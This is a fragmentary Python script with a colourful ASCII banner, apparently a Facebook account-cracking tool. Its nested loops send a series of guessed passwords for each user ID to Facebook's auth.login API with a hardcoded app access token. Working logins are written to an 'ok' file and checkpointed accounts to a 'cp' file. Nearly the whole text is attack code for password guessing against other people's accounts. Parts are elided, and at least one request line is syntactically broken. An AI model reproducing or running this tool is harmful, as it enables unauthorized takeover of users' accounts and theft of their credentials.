...
\033[1;92m    $$ /  \__|$$ /  $$ |$$ /  \__|
\033[1;93m    \$$$$$$\  $$$$$$$$ |\$$$$$$\  
\033[1;93m     \____$$\ $$  __$$ | \____$$\ 
\033[1;92m    $$\   $$ |$$ |  $$ |$$\   $$ |
\033[1;92m    \$$$$$$  |$$ |  $$ |\$$$$$$  |
\033[1;92m     \______/ \__|  \__| \______/                                                                                                   \033[1;93m-----------------------------------------------------
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("SYED-ZADAok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("SYED-ZADAcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("SYED-ZADAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("SYED-ZADAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("SYED-ZADAcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("SYED-ZADAok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("SYED-ZADAcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("SYED-ZADAok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("SYED-ZADAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("SYED-ZADAok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
...
def choice_select():
	...
	if select =="1":
		...
		print("")
		pass1 = raw_input("\x1b[1;93m name + pass:\x1b[1;92m ")
		pass2 = raw_input("\x1b[1;93m name + pass:\x1b[1;92m ")
		pass3 = raw_input("\x1b[1;93m name + pass:\x1b[1;92m ")
	...
	def main(arg):
		...
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="name+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("SYED-ZADAok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					if "access_token" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="name+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("SYED-ZADAok.txt", "a")
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [SUFYAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("SYED-ZADAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
